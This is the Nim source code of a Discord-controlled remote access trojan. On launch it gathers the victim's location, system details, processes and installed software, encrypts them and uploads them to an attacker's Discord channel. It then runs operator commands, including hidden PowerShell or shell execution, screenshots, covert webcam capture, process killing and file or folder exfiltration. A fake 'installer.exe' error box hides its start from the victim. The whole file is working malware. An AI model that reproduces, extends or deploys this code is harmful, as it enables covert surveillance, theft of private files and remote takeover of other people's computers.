{.passL: "materials/resources.res".}

import dimscord_nossl, asyncdispatch, options, strutils, strformat, osproc, os, tables, times
import random
import zippy/ziparchives
import src/location, src/sysinfo, src/pmon, src/constants, src/screenshot, src/webcam, src/crypto

when defined(windows):
    import winim/lean

let token = RunnerToken
let discord = newDiscordClient(token)
var userCwd = initTable[string, string]()
var controlChannel: Option[string] = none(string)
var isMonitoring = false
var monitorStarted = false
var heartbeatStarted = false

proc heartbeatLoop(channelId: string) {.async.}

randomize()


proc currentStamp(): string =
    (now().utc + initDuration(hours = 1)).format("yyyy-MM-dd HH:mm:ss 'CET'")

proc currentEpoch(): int64 =
    getTime().toUnix()

proc randomShortName(len: int = 6): string =
    const alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
    result = newString(len)
    for i in 0 ..< len:
        result[i] = alphabet[rand(alphabet.len - 1)]

# Helper to encrypt payload and send to Dropzone for Watcher to relay
proc sendEncryptedFile(destChannelId: string, filename: string, content: string) {.async.} =
    try:
        # Create manifest
        let manifest = &"{{\"replyTo\": \"{destChannelId}\", \"filename\": \"{filename}\"}}"
        
        var entries = initTable[string, string]()
        entries["meta.json"] = manifest
        entries["content.dat"] = content # Generic name, watcher will rename based on manifest
        
        # Create ZIP
        let zipData = createZipArchive(entries)
        
        # Encrypt ZIP using AES-256
        let encrypted = encryptAes256(zipData, SharedKey)
        let encFilename = randomShortName(8) & ".dat"
        
        # Upload to Dropzone
        let dropChan = DropzoneChannelId
        let fileObj = DiscordFile(name: encFilename, body: encrypted)
        discard await discord.api.sendMessage(dropChan, files = @[fileObj])

    except CatchableError as e:
         discard await discord.api.sendMessage(destChannelId, "❌ **Failed to encrypt/upload:** " & e.msg)


# Helper to write string to temp file, send it, and delete it (Legacy/Fallback)
proc sendTempJson(channelId: string, filename: string, content: string) {.async.} =
    # Redirect to encrypted path
    await sendEncryptedFile(channelId, filename, content)

proc sendShutdownMessage() {.async.} =
    if controlChannel.isSome:
        discard await discord.api.sendMessage(controlChannel.get(), "# ❌ Connection terminated!")

proc extractJsonValue(raw: string, key: string): string =
    let keyPattern = "\"" & key & "\""
    let keyPos = raw.find(keyPattern)
    if keyPos < 0: return ""
    let colonPos = raw.find(':', keyPos + keyPattern.len)
    if colonPos < 0: return ""

    var i = colonPos + 1
    while i < raw.len and raw[i].isSpaceAscii:
        inc i
    if i >= raw.len: return ""

    if raw[i] == '"':
        inc i
        let endPos = raw.find('"', i)
        if endPos < 0: return ""
        return raw[i ..< endPos]
    else:
        var endPos = i
        while endPos < raw.len and raw[endPos] notin {',', '\n', '\r', '}'}:
            inc endPos
        return raw[i ..< endPos].strip()

proc buildLocationSummary(location: string): (string, string) =
    var ip = extractJsonValue(location, "ip")
    let country = extractJsonValue(location, "country")
    let countryName = extractJsonValue(location, "country_name")
    let city = extractJsonValue(location, "city")

    if ip.len == 0:
        for part in location.splitWhitespace():
            if part.count('.') >= 3 and part.allCharsInSet({'0'..'9', '.'}):
                ip = part
                break
    if ip.len == 0:
        ip = getEnv("HOSTNAME", "unknown")
        # Ensure uniqueness if real IP is missing
        if ip == "unknown" or "localhost" in ip:
            ip &= "-" & randomShortName(4)

    var summary = "### IP: " & ip
    if country.len > 0 or countryName.len > 0 or city.len > 0:
        summary &= " (" & country & ", " & countryName & ", " & city & ")"
    result = (summary, ip)

proc buildPayloadFiles(location: string): (string, string, string, string, string) =
    # Build the individual payload files and return (locationFile, procsFile, appsFile, summaryLine, ip)
    let stamp = currentStamp()
    let sys = getSystemInfoText()
    let procs = getRunningProcessesText()
    let apps = getInstalledSoftwareText()

    let (summary, ip) = buildLocationSummary(location)

    var locationFile = "Timestamp: " & stamp & "\n"
    locationFile &= summary & "\n" & sys

    var procsFileStamped = "Timestamp: " & stamp & "\n" & procs
    var appsFileStamped = "Timestamp: " & stamp & "\n" & apps

    result = (locationFile, procsFileStamped, appsFileStamped, summary, ip)

proc heartbeatLoop(channelId: string) {.async.} =
    while true:
        let topic = "Last Heartbeat: " & currentStamp() & " | " & $currentEpoch()
        try:
            discard await discord.api.editGuildChannel(channelId, topic = some(topic))
            await sleepAsync(360_000) # 6 minutes (safe against rate limits)
        except CatchableError as e:
            await sleepAsync(30_000) # retry sooner on failure

proc waitForChannel(targetName: string, guildId: string) {.async.} =
    var foundChannelId = ""
    while foundChannelId.len == 0:
        try:
            let channels = await discord.api.getGuildChannels(guildId)
            for ch in channels:
                if ch.name == targetName:
                    foundChannelId = $ch.id
                    break
        except CatchableError:
            discard
        
        if foundChannelId.len == 0:
            await sleepAsync(10_000) # Check every 10 seconds to avoid spamming API
    
    controlChannel = some(foundChannelId)
    if not heartbeatStarted:
        heartbeatStarted = true
        asyncCheck heartbeatLoop(foundChannelId)

proc onReady(s: Shard, r: Ready) {.event(discord).} =
    # 1) Collect system data, package and encrypt
    let location = getLocation()
    let (locationFile, procsFile, appsFile, summaryLine, ipFromPayload) = buildPayloadFiles(location)
    var entries = initTable[string, string]()

    entries["location-system_info.txt"] = locationFile
    entries["running-processes.txt"] = procsFile
    entries["installed-apps.txt"] = appsFile

    let zipData = createZipArchive(entries)
    
    # Encrypt using AES-256
    let encrypted = encryptAes256(zipData, SharedKey)
    let encFilename = randomShortName(8) & ".dat"

    # 2) Upload to drop-zone channel
    let dropChan = DropzoneChannelId
    try:
        let fileObj = DiscordFile(name: encFilename, body: encrypted)
        discard await discord.api.sendMessage(dropChan, files = @[fileObj])
    except CatchableError as e:
        echo "Failed to upload payload: " & e.msg
    
    # 3) Wait for the watcher to create the channel for this runner (asynchronously)
    let ip = if ipFromPayload.len > 0: ipFromPayload else: getEnv("HOSTNAME", "unknown")
    let targetName = ip
        .replace(".", "-")
        .replace(":", "-")
        .toLowerAscii()
    let guildId = TargetGuildId
    
    asyncCheck waitForChannel(targetName, guildId)
    #discard await discord.api.sendMessage(foundChannelId, "# ✅ Connection established.\n## System information:\n" & locationFile)


proc startProcessMonitor() {.async.} =
    while true:
        await sleepAsync(2000) # polling interval 2 seconds
        if not isMonitoring: continue

        if controlChannel.isSome:
            let (spawns, terms) = getProcessDiffs()
            let chan = controlChannel.get()
            
            # report spawns
            for item in spawns:
                # Re-check isMonitoring in case pmoff was typed while sending
                if not isMonitoring: break
                discard await discord.api.sendMessage(chan, "**[+] Spawned:** " & item)
            
            # report terminations
            for item in terms:
                if not isMonitoring: break
                discard await discord.api.sendMessage(chan, "**[-] Terminated:** " & item)




proc messageCreate(s: Shard, m: Message) {.event(discord).} =
    if m.author.bot: return

    # Only respond to messages sent in the control channel for this machine.
    if controlChannel.isNone or $m.channelId != controlChannel.get(): return

    elif m.content.len > 0:
        try:
            let userId = $m.author.id
            let currentCwd = userCwd.getOrDefault(userId, getCurrentDir())
            let cmd = m.content.strip()

            if cmd.len == 0: return

            # --- CUSTOM COMMANDS ---

            elif cmd == "help": return
            elif cmd == "pmon":
                if not isMonitoring:
                    isMonitoring = true
                    resetBaseline() # From pmon.nim
                    if not monitorStarted:
                        monitorStarted = true
                        asyncCheck startProcessMonitor()
                    discard await m.reply("### ✅ Started monitoring of processes.", mention = false)
                return

            elif cmd == "pmoff":
                isMonitoring = false
                discard await m.reply("### 🛑 Process monitoring has been stopped.", mention = false)
                return
            
            elif cmd == "cd home": # cd to home directory
                let home = getHomeDir()
                userCwd[userId] = home
                discard await m.reply("📁 **Changed directory to:**\n" & home, mention = false)
                return

            elif cmd == "cd desk": # cd to Desktop directory
                let home = getHomeDir()
                let desk = joinPath(home, "Desktop")
                if dirExists(desk):
                    userCwd[userId] = desk
                    discard await m.reply("📁 **Changed directory to:**\n" & desk, mention = false)
                else:
                    discard await m.reply("❌ **Desktop directory not found:**\n" & desk, mention = false)
                return

            elif cmd == "info": # send location and system info
                let location = getLocation()
                let sysInfo = getSystemInfoText()
                let payload = &"Timestamp: {currentStamp()}\n{location}\n{sysInfo}"
                await m.channelId.sendTempJson("location-system.txt", payload)
                return

            elif cmd == "shot":
                when defined(windows):
                    let path = getScreenshotAsTempFile()
                    if path.len > 0:
                         try:
                             # Read binary content
                             let content = readFile(path)
                             await sendEncryptedFile(m.channelId, "screenshot.png", content)
                         except CatchableError as e:
                             discard await m.reply("❌ **Failed to send screenshot:** " & e.msg, mention = false)
                         finally:
                             try: removeFile(path) except: discard
                    else:
                         discard await m.reply("❌ **Failed to capture screenshot.**", mention = false)
                else:
                    discard await m.reply("❌ Screenshot command is only available on Windows.", mention = false)
                return

            elif cmd == "camera":
                when defined(windows):
                    let path = joinPath(getTempDir(), "webcam_" & $currentEpoch() & ".png")
                    if captureWebcam(path):
                         try:
                             let content = readFile(path)
                             await sendEncryptedFile(m.channelId, "webcam.png", content)
                             #discard await m.reply("### 📸 Webcam captured.", mention = false)
                         except CatchableError as e:
                             discard await m.reply("❌ **Failed to send webcam image:** " & e.msg, mention = false)
                         finally:
                             try: removeFile(path) except: discard
                    else:
                         discard await m.reply("❌ **Failed to capture webcam.** (No device or busy)", mention = false)
                else:
                    discard await m.reply("❌ Webcam command is only available on Windows.", mention = false)
                return

            elif cmd == "procs": # send processes.txt
                when defined(windows):
                    let stamped = "Timestamp: " & currentStamp() & "\n" & getRunningProcessesText()
                    await m.channelId.sendTempJson("running-processes.txt", stamped)
                else:
                    discard await m.reply("❌ Running processes inventory is only available on Windows.", mention = false)
                return

            elif cmd == "apps": # send installed_apps.txt
                when defined(windows):
                    let stamped = "Timestamp: " & currentStamp() & "\n" & getInstalledSoftwareText()
                    await m.channelId.sendTempJson("installed_apps.txt", stamped)
                else:
                    discard await m.reply("❌ Installed applications inventory is only available on Windows.", mention = false)
                return

            elif cmd.startsWith("clear "): # delete a certain number of recent messages
                let parts = cmd.splitWhitespace()
                if parts.len > 1:
                    try:
                        let count = parseInt(parts[1]) + 1
                        
                        if count < 1 or count > 100:
                            discard await m.reply("⚠️ Please provide a number between 1 and 100.", mention = false)
                        else:
                            # Get the last X messages and bulk delete them
                            let messages = await discord.api.getChannelMessages(m.channelId, limit = count)
                            var messageIds: seq[string] = @[]

                            for msg in messages:
                                messageIds.add(msg.id)
                            
                            await discord.api.bulkDeleteMessages(m.channelId, messageIds)

                    except ValueError:
                        discard await m.reply("❌ **Invalid amount.** Use `clear 10`.", mention = false)
                    except CatchableError as e:
                        discard await m.reply("⚠️ **Error deleting messages:** " & e.msg, mention = false)
                return

            elif cmd.startsWith("pkill "):
                let target = cmd[6..^1].strip()
                if target.len == 0:
                    discard await m.reply("⚠️ **Usage:** `pkill <PID or Name>`", mention = false)
                    return

                var killCmd: string
                when defined(windows):
                    # /F = force, /T = tree kill, /PID or /IM based on input
                    if target.allCharsInSet(Digits):
                        killCmd = &"taskkill /F /T /PID {target}"
                    else:
                        killCmd = &"taskkill /F /T /IM {target}"
                else:
                    if target.allCharsInSet(Digits):
                        killCmd = &"kill -9 {target}"
                    else:
                        killCmd = &"pkill -9 {target}"

                let (output, exitCode) = execCmdEx(killCmd, {ProcessOption(6)})
                let killResult = if exitCode == 0: &"✅ **Success:** {target} has been terminated"
                else: &"❌ **Failure:** Could not terminate {target}. Make sure the PID/Name is correct."
                
                let confirm = await m.reply(killResult, mention = false)
                return

            elif cmd.startsWith("dwn "):
                let rawPath = cmd[4..^1].strip()
                if rawPath.len == 0:
                     discard await m.reply("⚠️ **Usage:** `dwn <path>`", mention = false)
                     return
                
                let target = if rawPath.isAbsolute: rawPath else: joinPath(currentCwd, rawPath)
                
                if dirExists(target):
                    try:
                        var entries = initTable[string, string]()
                        var totalSize = 0
                        const MaxSize = 50 * 1024 * 1024 # 50MB RAM safeguard
                        
                        for file in walkDirRec(target):
                            try:
                                let fileSize = getFileSize(file)
                                if totalSize + fileSize > MaxSize:
                                    discard await m.reply("⚠️ **Limit reached (50MB).** Sending partial archive...", mention = false)
                                    break
                                
                                let content = readFile(file)
                                totalSize += fileSize.int
                                
                                # Store files relative to the target directory
                                let relPath = relativePath(file, target)
                                entries[relPath] = content
                            except CatchableError:
                                continue

                        if entries.len == 0:
                            discard await m.reply("⚠️ **Directory is empty or unreadable.**", mention = false)
                            return

                        let zipData = createZipArchive(entries)
                        let (_, dirName, _) = splitFile(target)
                        
                        await sendEncryptedFile(m.channelId, dirName & ".zip", zipData)
                    except CatchableError as e:
                        discard await m.reply("❌ **Failed to zip/upload directory:** " & e.msg, mention = false)
                    return

                elif fileExists(target):
                    try:
                        let content = readFile(target)
                        let (_, name, ext) = splitFile(target)
                        let filename = name & ext
                        
                        await sendEncryptedFile(m.channelId, filename, content)
                    except CatchableError as e:
                        discard await m.reply("❌ **Upload failed:** " & e.msg, mention = false)
                    return
                
                else:
                     discard await m.reply("❌ **Path not found:**\n" & target, mention = false)
                     return
            
            # --- SHELL COMMANDS ---

            elif cmd == "cd":
                discard await m.reply(currentCwd, mention = false)
                return

            elif cmd.startsWith("cd "):
                let rawTarget = cmd[3..^1].strip()
                if rawTarget.len == 0:
                    discard await m.reply("📁 " & currentCwd, mention = false)
                    return

                let target = if rawTarget.isAbsolute: rawTarget else: joinPath(currentCwd, rawTarget)
                var normalized = target
                normalizePath(normalized)
                if dirExists(normalized):
                    userCwd[userId] = normalized
                    discard await m.reply("📁 **Changed directory to:**\n" & normalized, mention = false)
                else:
                    discard await m.reply("❌ **Directory not found:**\n" & normalized, mention = false)
                return

            # Launch GUI-ish executables detached
            let parts = cmd.splitWhitespace()
            let exe = if parts.len > 0: parts[0].toLowerAscii() else: ""
            if exe.len > 0 and (exe.endsWith(".exe") or exe in ["notepad", "explorer", "calc", "mspaint"]):
                let args = if parts.len > 1: parts[1..^1] else: @[]
                try:
                    let childProc = startProcess(
                        command = parts[0],
                        args = args,
                        workingDir = currentCwd,
                        options = {poUsePath, poStdErrToStdOut, poDaemon}
                    )
                    let pid = processID(childProc)
                    discard await m.reply(&"**Started process:** {cmd}\n• PID: {pid}\n• Name: {parts[0]}", mention = false)
                except CatchableError as e:
                    discard await m.reply("❌ **Failed to start process:** " & e.msg, mention = false)
                return

            when defined(windows):
                let escapedCwd = currentCwd.replace("'", "''")
                let psScript = "Set-Location -LiteralPath '" & escapedCwd & "'; " & cmd
                let (output, exitCode) = execCmdEx(
                    "powershell -NoLogo -NoProfile -NonInteractive -WindowStyle Hidden -Command -",
                    {ProcessOption(6)},
                    nil,
                    currentCwd,
                    psScript)
            else:
                let escapedCmd = cmd.replace("\"", "\\\"")
                let (output, exitCode) = execCmdEx(
                    "sh -c \"" & escapedCmd & "\"",
                    {ProcessOption(6)},
                    nil,
                    workingDir = currentCwd)

            let res = output.strip()
            if exitCode == 0:
                if res.len == 0:
                    discard await m.reply("✅ **Command executed successfully with no output.**", mention = false)
                elif res.len > 1900:
                    try:
                        await m.channelId.sendTempJson("output.txt", res)
                    except CatchableError:
                        discard await m.reply("⚠️ **Output too large and upload failed.**", mention = false)
                else:
                    discard await m.reply(res, mention = false)
            else:
                if res.len == 0:
                    discard await m.reply("❌ **Incorrect command.**", mention = false)
                elif res.len > 1900:
                    discard await m.reply("❌ **Command failed (" & $exitCode & "). Output attached:**", mention = false)
                    try:
                        await m.channelId.sendTempJson("error.txt", res)
                    except CatchableError:
                         discard await m.reply("⚠️ **Error output too large and upload failed.**", mention = false)
                else:
                    discard await m.reply("❌ **Command failed (" & $exitCode & "):**\n" & res, mention = false)
        except CatchableError as e:
            discard await m.reply("❌ **Execution error:** " & e.msg, mention = false)


setControlCHook(proc () {.noconv.} =
    waitFor sendShutdownMessage()
    quit(0)
)

when defined(windows):
    proc showFakeError() {.thread.} =
        MessageBox(0, "The application was unable to start correctly (0xc000007b). Click OK to close the application.",
        "installer.exe - Application Error",
        MB_ICONERROR or MB_OK)
    
    var errorThread: Thread[void]
    createThread(errorThread, showFakeError)

waitFor discord.startSession(gateway_intents = {giMessageContent, giGuildMessages})